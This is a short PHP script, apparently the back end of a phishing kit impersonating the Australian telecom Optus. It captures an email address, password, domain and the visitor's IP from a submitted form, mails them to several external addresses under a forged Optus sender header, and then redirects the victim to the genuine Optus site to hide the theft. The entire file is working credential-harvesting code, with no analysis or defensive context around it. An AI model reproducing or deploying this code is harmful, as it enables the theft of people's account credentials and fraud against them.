   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ optus.com.au +-----------connect---\n";
$message .= "username: ".$_POST['email']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "goodnews4521@hotmail.com,goodnew09@yahoo.com,goodnews86@aol.com,spamtools33@gmail.com";
$subject = "optus.com.au";
$headers = "From: obinna<logs@www.optus.com.au>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://www.optus.com.au/");
	  

?>